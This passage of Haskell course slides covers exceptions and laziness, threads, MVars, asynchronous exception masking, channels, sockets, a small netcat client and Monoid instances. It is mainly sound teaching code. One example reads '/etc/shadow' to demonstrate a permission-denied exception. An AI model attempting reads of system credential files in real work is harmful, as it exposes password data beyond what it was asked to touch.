      pureCatcher :: a -> IO (Maybe a)
      pureCatcher a = (a `seq` return (Just a))
                      `catch` \(SomeException _) -> return Nothing

   ::

      pureCatcher $ 1 + 1
      Just 2
      *Main> pureCatcher $ 1 `div` 0
      Nothing
      *Main> pureCatcher (undefined :: String)
      Nothing

-  What happens if you do this?

   ::

      *Main> pureCatcher (undefined:undefined :: String)

.. _exceptions-and-laziness-1:

Exceptions and laziness
=======================

-  Consider the following function

   .. code:: haskell

      pureCatcher :: a -> IO (Maybe a)
      pureCatcher a = (a `seq` return (Just a))
                      `catch` \(SomeException _) -> return Nothing

   ::

      pureCatcher $ 1 + 1
      Just 2
      *Main> pureCatcher $ 1 `div` 0
      Nothing
      *Main> pureCatcher (undefined :: String)
      Nothing

-  What happens if you do this?

   ::

      *Main> pureCatcher (undefined:undefined :: String)
      Just "*** Exception: Prelude.undefined

.. _exceptions-and-laziness-2:

Exceptions and laziness
=======================

-  Consider the following function

   .. code:: haskell

      pureCatcher :: a -> IO (Maybe a)
      pureCatcher a = (a `seq` return (Just a))
                      `catch` \(SomeException _) -> return Nothing

   ::

      pureCatcher $ 1 + 1
      Just 2
      *Main> pureCatcher $ 1 `div` 0
      Nothing
      *Main> pureCatcher (undefined :: String)
      Nothing

-  What happens if you do this?

   ::

      *Main> pureCatcher (undefined:undefined :: String)
      Just "*** Exception: Prelude.undefined

-  ``catch`` only catches exceptions when thunks actually evaluated!

Exceptions and laziness continued
=================================

-  Evaluating a list does not evaluate the head or tail

   ::

      *Main> seq (undefined:undefined) ()
      ()

   -  Just evaluates the constructor (i.e., ``(:)`` or ``[]``)

-  Exercise: Force evaluation of every element of a list

   -  Write ``seq``-like function with the following signature, that
      evaluates every element of list before evaluating second argument

   .. code:: haskell

      seqList :: [a] -> b -> b

   ::

      *Main> seqList [1, 2, 3] ()
      ()
      *Main> seqList [1, 2, 3, undefined] ()
      *** Exception: Prelude.undefined

Solution
========

.. code:: haskell

   seqList :: [a] -> b -> b
   seqList [] b     = b
   seqList (a:as) b = seq a $ seqList as b

-  Note, there is a function
   ```deepseq`` <http://hackage.haskell.org/package/deepseq-1.3.0.2/docs/Control-DeepSeq.html#v:deepseq>`__
   in library of same name that does this for many common data types

A few more exception functions
==============================

-  ``try`` returns ``Right a`` normally, ``Left e`` if an exception
   occurred

   .. code:: haskell

      try :: Exception e => IO a -> IO (Either e a)

-  ``finally`` and ``onException`` run an clean-up action

   .. code:: haskell

      finally :: IO a -> IO b -> IO a      -- cleanup always
      onException :: IO a -> IO b -> IO a  -- after exception

   -  Result of cleanup action (``b``) is discarded

-  ``catchJust`` catches only exceptions matching a predicate on value

   .. code:: haskell

      catchJust :: Exception e =>
                   (e -> Maybe b) -> IO a -> (b -> IO a) -> IO a

      readFileIfExists f = catchJust p (readFile f) (\_ -> return "")
        where p e = if isDoesNotExistError e then Just e else Nothing

   ::

      *Main> readFileIfExists "/nosuchfile"
      ""
      *Main> readFileIfExists "/etc/shadow"
      *** Exception: /etc/shadow: openFile: permission denied ...

Monadic exceptions
==================

-  Language-level exceptions can be cumbersome for non-``IO`` actions

   -  Non-determinism is annoying
   -  Often want to detect error without assuming the ``IO`` monad
   -  Many monads built on top of ``IO`` also can’t catch exceptions

-  Often it is better to implement error handling in the Monad

   -  Recall the ``Maybe`` Monad, where can use ``Nothing`` to indicate
      failure

   .. code:: haskell

      instance  Monad Maybe  where
          (Just x) >>= k = k x
          Nothing  >>= _  = Nothing
          return = Just
          fail _ = Nothing

   -  Note ``fail`` method called when bind pattern matches fail in
      ``do`` block

   .. code:: haskell

      *Main> (do 1 <- return 2; return 3) :: Maybe Int
      Nothing

Haskell threads
===============

-  Haskell implements user-level threads in
   ```Control.Concurrent`` <http://hackage.haskell.org/packages/archive/base/latest/doc/html/Control-Concurrent.html>`__

   -  Threads are lightweight (in both time and space)
   -  Use threads where in other languages would use cheaper constructs
   -  Runtime emulates blocking OS calls in terms of non-blocking ones
   -  Thread-switch can happen any time GC could be invoked

-  ``forkIO`` call creates a new thread:

   .. code:: haskell

      forkIO :: IO () -> IO ThreadId    -- creates a new thread

-  A few other very useful thread functions:

   .. code:: haskell

      throwTo :: Exception e => ThreadId -> e -> IO ()
      killThread :: ThreadId -> IO ()   -- = flip throwTo ThreadKilled
      threadDelay :: Int -> IO ()       -- sleeps for # of µsec
      myThreadId :: IO ThreadId

Example: timeout
================

-  Execute ``IO`` action, or abort after # of µsec

   -  ```System.Timeout`` <http://hackage.haskell.org/packages/archive/base/latest/doc/html/System-Timeout.html>`__
      has a slightly better version of this function

.. code:: haskell

   data TimedOut = TimedOut UTCTime deriving (Eq, Show, Typeable)
   instance Exception TimedOut

   timeout :: Int -> IO a -> IO (Maybe a)
   timeout usec action = do
     -- Create unique exception val (for nested timeouts):
     expired <- fmap TimedOut getCurrentTime

     ptid <- myThreadId
     let child = do threadDelay usec
                    throwTo ptid expired
         parent = do ctid <- forkIO child
                     result <- action
                     killThread ctid
                     return $ Just result
     catchJust (\e -> if e == expired then Just e else Nothing) 
               parent
               (\_ -> return Nothing)

.. _mvarsmvar:

MVar
====

-  The
   ```MVar`` <http://hackage.haskell.org/packages/archive/base/latest/doc/html/Control-Concurrent-MVar.html>`__
   type lets threads communicate via shared variables

   -  An ``MVar t`` is a mutable variable of type ``t`` that is either
      *full* or *empty*

   .. code:: haskell

      newEmptyMVar :: IO (MVar a)  -- create empty MVar
      newMVar :: a -> IO (MVar a)  -- create full MVar given val

      takeMVar :: MVar a -> IO a
      putMVar :: MVar a -> a -> IO ()

   -  If an ``MVar`` is full, ``takeMVar`` makes it empty and returns
      former contents
   -  If an ``MVar`` is empty, ``putMVar`` fills it with a value
   -  Taking an empty ``MVar`` or putting a full one puts thread to
      sleep until ``MVar`` becomes available
   -  Only one thread awakened at a time if several blocked on same
      ``MVar``
   -  There are also non-blocking versions of ``MVar`` calls

   .. code:: haskell

      tryTakeMVar :: MVar a -> IO (Maybe a) -- Nothing if empty
      tryPutMVar :: MVar a -> a -> IO Bool  -- False if full

Example: pingpong benchmark
===========================

.. code:: haskell

   import Control.Concurrent
   import Control.Exception
   import Control.Monad

   pingpong :: Bool -> Int -> IO ()
   pingpong v n = do
     mvc <- newEmptyMVar   -- MVar read by child
     mvp <- newEmptyMVar   -- MVar read by parent
     let parent n | n > 0 = do when v $ putStr $ " " ++ show n
                               putMVar mvc n
                               takeMVar mvp >>= parent
                  | otherwise = return ()
         child = do n <- takeMVar mvc
                    putMVar mvp (n - 1)
                    child
     tid <- forkIO child
     parent n `finally` killThread tid
     when v $ putStrLn ""

::

   *Main> pingpong True 10
    10 9 8 7 6 5 4 3 2 1

Sidenote: benchmarking
======================

-  Bryan has a kick-ass benchmarking library
   `criterion <http://hackage.haskell.org/package/criterion>`__

.. code:: haskell

   import Criterion.Main

   ...

   main :: IO ()
   main = defaultMain [
           bench "thread switch test" mybench
          ]
       where mybench = pingpong False 10000

::

   $ ghc -O pingpong.hs 
   [1 of 1] Compiling Main             ( pingpong.hs, pingpong.o )
   Linking pingpong ...
   $ ./pingpong 
   ...
   benchmarking thread switch test
   mean: 3.774590 ms, lb 3.739223 ms, ub 3.808865 ms, ci 0.950
   ...

-  ~3.8 msec for 20,000 thread switches = ~190 nsec/switch

OS threads
==========

-  GHC also has *two* versions of the haskell runtime

   -  By default, all Haskell threads run in a single OS thread
   -  Link with ``-threaded`` to allow OS threads (``pthread_create``)
      as well

-  ``forkOS`` call creates Haskell thread *bound* to a new OS thread

   .. code:: haskell

      forkOS :: IO () -> IO ThreadId

-  Also, when linked with ``-threaded``, initial thread is bound

-  Whoa… what happened? ``-threaded`` 30 times slower?

::

   $ rm pingpong
   $ ghc -threaded -O pingpong.hs 
   Linking pingpong ...
   $ ./pingpong
   ...
   mean: 121.1729 ms, lb 120.5601 ms, ub 121.7044 ms, ci 0.950
   ...

Bound vs. unbound threads
=========================

-  Without ``-threaded``, all Haskell threads run in one OS thread

   -  Thread switch is basically just a procedure call, i.e. super-fast

-  ``-threaded`` introduces multiple OS-level threads

   -  Some Haskell threads are *bound* to a particular OS thread
   -  *Unbound* Haskell threads share (and migrate between) OS threads
   -  ``unbound`` haskell threads have same performance as w/o
      ``-threaded``

-  Initial thread bound, so we were actually benchmarking Linux

   -  Can wrap parent thread in ``forkIO`` to make it unbound

   .. code:: haskell

      wrap :: IO a -> IO a
      wrap action = do
        mv <- newEmptyMVar
        _ <- forkIO $ (action >>= putMVar mv) `catch`
                      \e@(SomeException _) -> putMVar mv (throw e)
        takeMVar mv

   -  But library has better function
      ```runInUnboundThread`` <http://hackage.haskell.org/packages/archive/base/latest/doc/html/Control-Concurrent.html#v:runInUnboundThread>`__

What good are OS threads?
=========================

-  If an unbound thread blocks, can block whole program

   -  Unix runtime tries to avoid blocking syscalls, but can’t avoid
      blocking for things like file system IO and paging
   -  Also relevant to foreign function interface (FFI)
   -  GHC allows to kinds of calls into C code, ``safe`` and ``unsafe``
   -  With ``-threaded``, GHC ensures ``safe`` FFI calls run in separate
      OS thread
   -  ``unsafe`` FFI calls from unbound threads can block other threads

-  FFI functions may expect to be called from same thread

   -  E.g., foreign code using ``pthread_getspecific`` can get confused
      if called from a migrated unbound thread

-  May want to override scheduler and run on particular CPU

   -  E.g., see
      ```forkOn`` <http://hackage.haskell.org/packages/archive/base/latest/doc/html/Control-Concurrent.html#v:forkOn>`__

Asynchronous exceptions
=======================

-  Some handy ``MVar`` utility functions for updating a value

   .. code:: haskell

      modifyMVar :: MVar a -> (a -> IO (a, b)) -> IO b
      modifyMVar_ :: MVar a -> (a -> IO a) -> IO ()

   -  E.g., “``modifyMVar x (\n -> return (n+1, n))``” like “``x++``” in
      C

-  How would you implement ``modifyMVar``?

   .. code:: haskell

      modifyMVar :: MVar a -> (a -> IO (a,b)) -> IO b
      modifyMVar m action = do
        v0 <- takeMVar m
        (v, r) <- action v0 `onException` putMVar m v0
        putMVar m v
        return r

   -  Anyone see a problem? (Hint: remember ``throwTo``, ``killThread``)

.. _asynchronous-exceptions-1:

Asynchronous exceptions
=======================

-  Some handy ``MVar`` utility functions for updating a value

   .. code:: haskell

      modifyMVar :: MVar a -> (a -> IO (a, b)) -> IO b
      modifyMVar_ :: MVar a -> (a -> IO a) -> IO ()

   -  E.g., “``modifyMVar x (\n -> return (n+1, n))``” like “``x++``” in
      C

-  How would you implement ``modifyMVar``?

   .. code:: haskell

      modifyMVar :: MVar a -> (a -> IO (a,b)) -> IO b
      modifyMVar m action = do
        v0 <- takeMVar m -- -------------- oops, race condition
        (v, r) <- action v0 `onException` putMVar m v0
        putMVar m v
        return r

   -  What if another thread calls ``killThread`` on the current thread
      while current thread between ``takeMVar`` and ``onException``
   -  ``timeout`` and ``wrap`` functions from a few slides ago have same
      problem

Masking exceptions
==================

-  The
   ```mask`` <http://hackage.haskell.org/packages/archive/base/latest/doc/html/Control-Exception.html#v:mask>`__
   function can sidestep such race conditions

   .. code:: haskell

      mask :: ((forall a. IO a -> IO a) -> IO b) -> IO b

   -  This is a funny type signature–uses an extension called
      ``RankNTypes``. For now, ignore “``forall a.``”–just makes
      function more flexible
   -  ``mask $ \f -> b`` runs action ``b`` with asynchronous exceptions
      *masked*
   -  Function ``f`` allows exceptions to be *unmasked* again for an
      action
   -  Exceptions are also unmasked if thread sleeps (e.g., in
      ``takeMVar``)

-  Example: Fixing ``modifyMVar``

   .. code:: haskell

      modifyMVar :: MVar a -> (a -> IO (a,b)) -> IO b
      modifyMVar m action = mask $ \unmask -> do
        v0 <- takeMVar m -- automatically unmasked while waiting
        (v, r) <- unmask (action v0) `onException` putMVar m v0
        putMVar m v
        return r

Masking exceptions (continued)
==============================

-  ``forkIO`` preserves the current mask state

   -  Can use the ``unmask`` function in child thread

-  Example: fixed ``wrap`` function

.. code:: haskell

   wrap :: IO a -> IO a          -- Fixed version of wrap
   wrap action = do
     mv <- newEmptyMVar
     mask $ \unmask -> do
         tid <- forkIO $ (unmask action >>= putMVar mv) `catch`
                         \e@(SomeException _) -> putMVar mv (throw e)
         let loop = takeMVar mv `catch` \e@(SomeException _) ->
                    throwTo tid e >> loop
         loop

-  Note we don’t call ``unmask`` in parent thread

   -  ``loop`` will sleep on ``takeMVar``, which implicitly unmasks
   -  Unmask while sleeping is generally what you want, but can avoid
      with
      `uninterruptibleMask <http://hackage.haskell.org/packages/archive/base/latest/doc/html/Control-Exception.html#v:uninterruptibleMask>`__

The bracket function
====================

-  ``mask`` is tricky, but library function
   ```bracket`` <http://hackage.haskell.org/packages/archive/base/latest/doc/html/Control-Exception.html#v:bracket>`__
   simplifies use

   .. code:: haskell

      bracket :: IO a -> (a -> IO b) -> (a -> IO c) -> IO c

-  Example: process file without leaking handle

   .. code:: haskell

      bracket (openFile "/etc/mtab" ReadMode) -- first
              hClose                          -- last
              (\h -> hGetContents h >>= doit) -- main

-  Example: fix ``parent`` function from our ``timeout`` example

   .. code:: haskell

        parent = do ctid <- forkIO child             -- old code,
                    result <- action                 -- bad if async
                    killThread ctid                  -- exception
                    return $ Just result

   .. code:: haskell

        parent = bracket (forkIO child) killThread $ -- new code
                 \_ -> fmap Just action

Working with ``MVar`` s
========================

-  ``MVar`` s work just fine as a mutex:

   .. code:: haskell

      -- type introduces type alias (like typedef in C)
      type Mutex = MVar ()

      mutex_create :: IO Mutex
      mutex_create = newMVar ()

      mutex_lock, mutex_unlock :: Mutex -> IO ()
      mutex_lock = takeMVar
      mutex_unlock mv = putMVar mv ()

      mutex_synchronize :: Mutex -> IO a -> IO a
      mutex_synchronize mv action =
          bracket (mutex_lock mv) (\_ -> mutex_unlock mv)
                      (\_ -> action)

-  Note anyone can unlock a ``Mutex`` if it is locked

   -  How would you throw assertion failure if caller doesn’t hold lock?

Alternate ``Mutex``
===================

-  Use *full* ``MVar`` rather than empty to mean lock held

   .. code:: haskell

      type Mutex = MVar ThreadId

      mutex_create :: IO Mutex
      mutex_create = newEmptyMVar

      mutex_lock, mutex_unlock :: Mutex -> IO ()

      mutex_lock mv = myThreadId >>= putMVar mv

      mutex_unlock mv = do mytid <- myThreadId
                           lockTid <- tryTakeMVar mv
                           unless (lockTid == Just mytid) $
                               error "mutex_unlock"

   -  Store ``ThreadId`` of lock owner in ``MVar``

-  How would you implement a condition variable?

   -  Many uses of condition variables don’t work with async exceptions
   -  So let’s not worrying about ``mask`` for this question…

Condition variables
===================

.. code:: haskell

   data Cond = Cond (MVar [MVar ()])

   cond_create :: IO Cond
   cond_create = liftM Cond $ newMVar []
   -- liftM is fmap for Monads (i.e., no required Functor instance):
   -- liftM f m1 = do x <- m1; return (f m1)

   cond_wait :: Mutex -> Cond -> IO ()
   cond_wait m (Cond waiters) = do
     me <- newEmptyMVar
     modifyMVar_ waiters $ \others -> return $ others ++ [me]
     mutex_unlock m   -- note we don't care if preempted after this
     takeMVar me `finally` mutex_lock m
     
   cond_signal, cond_broadcast :: Cond -> IO ()
   cond_signal (Cond waiters) = modifyMVar_ waiters wakeone
       where wakeone [] = return []
             wakeone (w:ws) = putMVar w () >> return ws

   cond_broadcast (Cond waiters) = modifyMVar_ waiters wakeall
       where wakeall ws = do mapM_ (flip putMVar ()) ws
                             return []

-  Key idea: putting ``MVar`` s inside ``MVar`` s is very powerful

Channels
========

-  ```Control.Concurrent.Chan`` <http://hackage.haskell.org/packages/archive/base/latest/doc/html/Control-Concurrent-Chan.html>`__
   provides unbounded *channels*

   -  Implemented as two ``MVar`` s – for read and and write end of
      ``Stream``

   .. code:: haskell

      data Item a = Item a (Stream a)
      type Stream a = MVar (Item a)
      data Chan a = Chan (MVar (Stream a)) (MVar (Stream a))

.. image:: https://www.scs.stanford.edu/14sp-cs240h/slides/chan.svg


Channel implementation [simplified]
===================================

.. code:: haskell

   data Item a = Item a (Stream a)
   type Stream a = MVar (Item a)
   data Chan a = Chan (MVar (Stream a)) (MVar (Stream a))

   newChan :: IO (Chan a)
   newChan = do
     empty <- newEmptyMVar
     liftM2 Chan (newMVar empty) (newMVar empty)
   -- liftM2 is like liftM for functions of two arguments:
   -- liftM2 f m1 m2 = do x1 <- m1; x2 <- m2; return (f x1 x2)

   writeChan :: Chan a -> a -> IO ()
   writeChan (Chan _ w) a = do
     empty <- newEmptyMVar
     modifyMVar_ w $ \oldEmpty -> do
       putMVar oldEmpty (Item a empty)
       return empty

   readChan :: Chan a -> IO a
   readChan (Chan r _) =
       modifyMVar r $ \full -> do
         (Item a newFull) <- takeMVar full
         return (newFull, a)

Networking
==========

-  High-level Stream (TCP & Unix-domain) socket support in
   ```Network`` <http://hackage.haskell.org/packages/archive/network/latest/doc/html/Network.html>`__

   .. code:: haskell

      connectTo :: HostName -> PortID -> IO Handle
      listenOn :: PortID -> IO Socket
      accept :: Socket -> (Handle, HostName, PortNumber)
      sClose :: Socket -> IO ()
      hClose :: Handle -> IO ()

-  Exercise: Network-enabled rock-paper-scissors. Define:

   .. code:: haskell

      withClient :: PortID -> (Handle -> IO a) -> IO a

-  This accepts connection, plays single game, exits

   ::

      *Main> withClient (PortNumber 1617) (computerVsUser Rock)

   ::

      $ nc localhost 1617
      Please enter one of [Rock,Paper,Scissors]
      Rock
      You Tie

-  Start with last week’s code: ``wget``
   ```cs240h.stanford.edu/rock2.hs`` <http://cs240h.stanford.edu/rock2.hs>`__

.. _solution-1:

Solution
========

.. code:: haskell

   withClient :: PortID -> (Handle -> IO a) -> IO a
   withClient listenPort fn =
     bracket (listenOn listenPort) sClose $ \s -> do
       bracket (accept s) (\(h, _, _) -> hClose h) $
         \(h, host, port) -> do
           putStrLn $ "Connection from host " ++ host
                      ++ " port " ++ show port
           fn h

Exercise
========

-  Build a program ``netrock`` that plays two users against one another
   and exits after one game

   ::

      $ nc localhost 1617
      Please enter one of [Rock,Paper,Scissors]
      Rock
      You Win

   ::

      $ nc localhost 1617
      Please enter one of [Rock,Paper,Scissors]
      Scissors
      You Lose

-  Start here: ``wget``
   ```cs240h.stanford.edu/netrock.hs`` <http://cs240h.stanford.edu/netrock.hs>`__,
   implement:

   .. code:: haskell

      netrock :: PortID -> IO ()

   -  You may find it useful to define and use:

      .. code:: haskell

         play :: MVar Move -> MVar Move
              -> (Handle, HostName, PortNumber) -> IO ()
         play myMoveMVar opponentMoveMVar (h, host, port) = do

   -  If your OS is missing ``nc``: ``wget``
      ```cs240h.stanford.edu/netcat.hs`` <http://cs240h.stanford.edu/netcat.hs>`__

.. _solution-2:

Solution
========

.. code:: haskell

   play :: MVar Move -> MVar Move
        -> (Handle, HostName, PortNumber) -> IO ()
   play myMoveMVar opponentMoveMVar (h, host, port) = do
     putStrLn $ "Connection from host " ++ host ++ " port " ++ show port
     myMove <- getMove h
     putMVar myMoveMVar myMove
     opponentMove <- takeMVar opponentMoveMVar
     let o = outcome myMove opponentMove
     hPutStrLn h $ "You " ++ show o

   netrock :: PortID -> IO ()
   netrock listenPort =
     bracket (listenOn listenPort) sClose $ \s -> do
       mv1 <- newEmptyMVar
       mv2 <- newEmptyMVar
       let cleanup mv (h,_,_) = do
             tryPutMVar mv (error "something blew up")
             hClose h
       wait <- newEmptyMVar
       forkIO $ bracket (accept s) (cleanup mv1) (play mv1 mv2)
         `finally` putMVar wait ()
       bracket (accept s) (cleanup mv2) (play mv2 mv1)
       takeMVar wait

.. _networking-1:

Networking
==========

-  Also have low-level BSD socket support in
   ```Network.Socket`` <http://hackage.haskell.org/packages/archive/network/latest/doc/html/Network-Socket.html>`__

   .. code:: haskell

      socket :: Family -> SocketType -> ProtocolNumber -> IO Socket
      connect :: Socket -> SockAddr -> IO ()
      bindSocket :: Socket -> SockAddr -> IO ()
      listen :: Socket -> Int -> IO ()
      accept :: Socket -> IO (Socket, SockAddr)

   -  ```getAddrInfo`` <http://hackage.haskell.org/packages/archive/network/latest/doc/html/Network-Socket.html#v:getAddrInfo>`__
      looks up hostnames just like
      `[RFC3493] <http://tools.ietf.org/html/rfc3493>`__ (returns
      ``[`` ```AddrInfo`` <http://hackage.haskell.org/packages/archive/network/latest/doc/html/Network-Socket.html#t:AddrInfo>`__ ``]``)

   .. code:: haskell

      getAddrInfo :: Maybe AddrInfo
                  -> Maybe HostName -> Maybe ServiceName
                  -> IO [AddrInfo]

   -  Example: Get ``SockAddr`` for talking to web server:

   .. code:: haskell

      webServerAddr :: String -> IO SockAddr
      webServerAddr name = do
        addrs <- getAddrInfo Nothing (Just name) (Just "www")
        return $ addrAddress $ head $ addrs

Example: netcat
===============

.. code:: haskell

   netcat :: String -> String -> IO ()
   netcat host port = do
     -- Extract address from first AddrInfo in list
     AddrInfo{ addrAddress = addr, addrFamily = family }:_
         <- getAddrInfo Nothing (Just host) (Just port)

     -- Create a TCP socket connected to server
     s <- socket family Stream 0
     connect s addr

     -- Convert socket to handle
     h <- socketToHandle s ReadWriteMode
     hSetBuffering h NoBuffering  -- THIS IS IMPORTANT

     -- Punt on complex locale stuff
     hSetBinaryMode stdout True

     -- Copy data back and forth taking advantage of laziness
     done <- newEmptyMVar
     forkIO $ (hGetContents h >>= putStr) `finally` putMVar done ()
     getContents >>= hPutStr h
     takeMVar done


/L4 Phantoms
============


Let's think about a programming pattern we've seen, but not paid
attention to.

Patterns: I
===========

.. code:: haskell

   0

.. code:: haskell

   0 + n  ==  n
   n + 0  ==  n

.. code:: haskell

   (a + b) + c  ==  a + (b + c)

Patterns: II
============

.. code:: haskell

   1

.. code:: haskell

   1 * n  ==  n
   n * 1  ==  n

.. code:: haskell

   (a * b) * c  ==  a * (b * c)

Patterns: III
=============

.. code:: haskell

   []

.. code:: haskell

   [] ++ n  ==  n
   n ++ []  ==  n

.. code:: haskell

   (a ++ b) ++ c  ==  a ++ (b ++ c)

Patterns: IV
============

.. code:: haskell

   True

.. code:: haskell

   True && n  ==  n
   n && True  ==  n

.. code:: haskell

   (a && b) && c == a && (b && c)

Patterns, abstracted
====================

Typeclass: 

.. code:: haskell

   class Monoid a where
       -- A "zero element"
       mempty  :: a
       -- An associative operation
       mappend :: a -> a -> a

Where can you find this typeclass? 

.. code:: haskell

   import Data.Monoid

Monoids
=======

Instances of ``Monoid`` must obey some rules.

Rule 1: identity element 

.. code:: haskell

   mempty `mappend` n  ==  n
   n `mappend` mempty  ==  n

Rule 2: our associative operation *must actually associate*.

.. code:: haskell

   (a `mappend` b) `mappend` c  ==
   a `mappend` (b `mappend` c)

Rules?
======

Monoids come from abstract algebra.

In abstract algebra, rules that must be true are called *axioms*.

Also called *laws*.

In Haskell, how are these rules/axioms/laws enforced? 

-  They are not.

Monoids for lists
=================

Here's the easiest and most familiar-to-Haskellers case: 

.. code:: haskell

   instance Monoid [a] where
        mempty           = []
        xs `mappend` ys  = xs ++ ys

Pop quiz: 

-  What other definition(s) would follow the ``Monoid`` laws?

-  Do they make any sense?

Monoids for numbers?
====================

Numbers are an interesting case.

Addition as monoid: 

-  Identity ``0``

-  Associative operator ``+``

Multiplication as monoid: 

-  Identity ``1``

-  Associative operator ``*``

When do we use typeclasses?
===========================

Suppose you want to abstract a code pattern into a typeclass.

Under what circumstances is this likely to work best? 

-  When there is *just one* "canonical" behaviour you expect for a given
   type.

For lists, our ``Monoid`` instance *is* canonical: 

-  Any other behaviour that follows the laws is just *weird*.

For numbers, we have two sensible behaviours: 

-  No one ``Monoid`` instance can be called canonical!

Monoids for multiplication
==========================

.. code:: haskell

   newtype Product a = Product { getProduct :: a }
       deriving (Eq, Ord, Read, Show, Bounded)

   instance Num a => Monoid (Product a) where
       mempty                        = Product 1

       Product x `mappend` Product y = Product (x * y)

Monoids for addition
====================

.. code:: haskell

   newtype Sum a = Sum { getSum :: a }
       deriving (Eq, Ord, Read, Show, Bounded)

   instance Num a => Monoid (Sum a) where
       mempty                = Sum 0

       Sum x `mappend` Sum y = Sum (x + y)

The ``Either`` type
===================

There exists a built-in type named ``Either``.

.. code:: haskell

   data Either a b = Left a | Right b

By convention: 

-  ``Left`` means "something went wrong"

-  ``Right`` means "result was a success"

Often used as follows: 

.. code:: haskell

   type Result a = Either String a

(where the ``String`` carries an error message)

Coding exercise
===============

Create a ``Monoid`` instance that will give the *first success* from a
chain of ``Either`` values.

Desired behaviour: 

.. code:: haskell

   Left "you goofed" `mappend`
   Left "i win!"     `mappend`
   Right "rats! you won!"

      ==

   Right "rats! you won!"

You have five minutes.

Ambient machinery for the coding exercise
=========================================

If you import ``Data.Monoid`` you will have the following definitions
available:

.. code:: haskell

   class Monoid a where
     mempty :: a
     mappend :: a -> a -> a

   data Either a b = Left a | Right b

Language hitch
==============

Did you try to write code like this? 

.. code:: haskell

   instance Monoid (Either a b) where
       mempty = Left {- what ??? -}

       Right a `mappend` _ = Right a
       _       `mappend` b = b

You surely ran into trouble while trying to define ``mempty``.

Why?

Type quantification
===================

In Haskell, type variables are *quantified*.

They stand in for all types in a given domain.

If there's no typeclass mentioned, a type variable is implicitly
*universally* quantified.

We can write these quantifiers explicitly: 

.. code:: haskell

   length :: forall a. [a] -> Int

"The ``length`` function must accept any list, no matter what type of
data it contains."

Universal quantification
========================

Why is universal quantification relevant here? 

.. code:: haskell

   instance Monoid (Either a b) where
       mempty = Left {- what ??? -}

.. _universal-quantification-1:

Universal quantification
========================

Why is universal quantification relevant here? 

.. code:: haskell

   instance Monoid (Either a b) where
       mempty = Left {- what ??? -}

Since ``mempty`` gives a "zero element", it must somehow produce a zero
element for the type ``a``.

But since ``a`` is universally quantified, it stands in for *every
type*.

Clearly there is no one legal value that is of every type.

It is impossible to write a sensible instance.

A possible fix
==============

This won't typecheck either: 

.. code:: haskell

   instance Monoid (Either String a) where
       mempty = Left "fnord"

       Right a `mappend` _ = Right a
       _       `mappend` b = b

However, we can make it compile by adding the following to the top of
our source file:

.. code:: haskell

   {-# LANGUAGE FlexibleInstances #-}

Pragmas
=======

This is a specially formatted comment: 

.. code:: haskell

   {- i am a normal comment -}

   {-# i am a special comment #-}

"Special" comments usually contain directives ("pragmas") that change
the compiler's behaviour.

The ``LANGUAGE`` pragma enables non-standard language features.

.. code:: haskell

   {-# LANGUAGE FlexibleInstances #-}

``FlexibleInstances`` makes the compiler consider `more typeclass
instances as
legal <http://www.haskell.org/ghc/docs/latest/html/users_guide/type-class-extensions.html#instance-rules>`__
than the Haskell 98 standard allows.

More about pragmas
==================

You'll see a few more pragmas as we progress.

Some are widely used, others are not.

Some are safe, others are not...

-  up to and including allowing the typechecker to go into an infinite
   loop! (``UndecidableInstances``)

``FlexibleInstances`` is widely used and often safe.

Back to our fix
===============

This *will* typecheck: 

.. code:: haskell

   {-# LANGUAGE FlexibleInstances #-}

   instance Monoid (Either String a) where
       mempty = Left "fnord"

       Right a `mappend` _ = Right a
       _       `mappend` b = b

But is it canonical?

Canonicality
============

Why worry about our ``Monoid`` instance being canonical? 

Any time you declare an instance of any typeclass: 

-  It is automatically made available to every module that imports your
   module.

-  You can't say "I don't want to import instance ``X``" :-(

If you define a weird instance of a popular typeclass, you'll "infect"
people who import your module.

-  Make sure your instances make sense!

Finally!
========

Via use of ``newtype``, we don't accidentally associate a silly
``Monoid`` instance with ``Either String a``.

.. code:: haskell

   {-# LANGUAGE FlexibleInstances #-}

   import Data.Monoid

   newtype FirstRight a b = FirstRight {
       getFirstRight :: Either a b
     }

   instance Monoid (FirstRight String a) where
     mempty = FirstRight (Left "suxx0rz")

     a@(FirstRight (Right _)) `mappend` _ = a
     _                        `mappend` b = b

HTTP POST
=========

Let's upload some vitally important data to a server.

::

   curl --data foo=bar --verbose \
     http://httpbin.org/post

Multipart form upload
=====================

When we POST multipart data to a form (e.g. uploading a photo), some
information is mandatory, while other stuff is optional.

.. code:: haskell

   data Part = Part {
       -- name of the <input> tag this belongs to
         name        :: String
       -- filename of file we're uploading
       , fileName    :: Maybe FilePath
       -- type of file
       , contentType :: Maybe ContentType
       -- file contents
       , body        :: String
       } deriving (Show)

Uploading data
==============

Suppose we want to build a HTTP client that supports POST.

Web pages tend to expect multipart form data, while REST APIs have
different needs.

Here are some types that let us represent a POST body.

.. code:: haskell

   type Param = (String, String)

   type ContentType = String

   data Payload = NoPayload
                | Raw ContentType String
                | Params [Param]
                | FormData [Part]
                  deriving (Show)

Can you write a ``Monoid`` instance for ``Payload``? 

Decide for yourself, then discuss with a partner for 2 minutes.

Huh
===

This part is easy enough: 

.. code:: haskell

   instance Monoid Payload where
       mempty = NoPayload

       mappend NoPayload b = b
       mappend a NoPayload = a

       mappend (Params a) (Params b) = Params (a++b)

       {- ... -}

What about the rest of ``mappend``? 

Semantic problems
=================

It is easy to see how we can glom together ``Params`` or ``FormData``.

.. code:: haskell

   data Payload = NoPayload
                | Raw ContentType String
                | Params [Param]
                | FormData [Part]

However, mixing ``Raw`` with ``Params``, or ``Params`` with
``FormData``, is nonsensical.

A straightforward ``Monoid`` instance will have to crash (!!!) if we try
this.

Handling failure (badly)
========================

What if we use the ``Maybe`` type to represent a failed attempt to
``mappend``?

.. code:: haskell

   {-# LANGUAGE FlexibleInstances #-}

   -- I dropped the NoPayload constructor. Why?
   data Payload = Raw ContentType String
                | Params [Param]
                | FormData [Part]
                  deriving (Show)

   instance Monoid (Maybe Payload) where
     mempty = Nothing

     mappend Nothing b = b
     mappend a Nothing = a

     mappend (Just (Params a)) (Just (Params b))
       = Just (Params (a++b))
     mappend (Just (FormData a)) (Just (FormData b))
       = Just (FormData (a++b))
     mappend _ _ = Nothing

Yay?
====

This compiles, but it has a conceptual problem.

-  Every time we use ``mappend``, we have to pattern-match the result to
   see if the ``mappend`` succeeded.

In API design circles, this is called "crappy".

But wait, it gets worse! 

O error message, where art thou?
================================

Let me try this in ``ghci``: 

.. code:: haskell

   Just (Params []) `mappend` Just (Params [])

Overlapping instances
=====================

Remember ``FlexibleInstances``? 

It allowed us to write a ``Monoid`` instance for the type
``Maybe Payload``.

